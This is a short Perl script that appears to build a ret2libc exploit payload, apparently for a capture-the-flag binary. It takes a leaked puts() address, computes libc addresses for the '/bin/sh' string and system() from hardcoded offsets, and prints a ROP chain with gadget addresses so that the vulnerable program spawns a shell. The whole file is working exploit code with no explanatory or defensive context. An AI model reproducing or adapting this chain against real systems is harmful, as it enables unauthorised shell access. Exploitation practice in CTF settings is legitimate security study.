#!/usr/bin/perl

use strict;
use warnings;

my $puts = 0x809d0;
my $str_bin_sh = 0x1abf05;
my $system = 0x4fa60;

if (@ARGV < 1) {
	die "no puts() address specified\n";
}

my $puts_actual = hex($ARGV[0]);

binmode(STDOUT);
print pack("Q", 0x401493);
print pack("Q", $puts_actual - $puts + $str_bin_sh);
print pack("Q", 0x401494);
print pack("Q", $puts_actual - $puts + $system);
#print pack("Q", 0x401080);
print "\n";
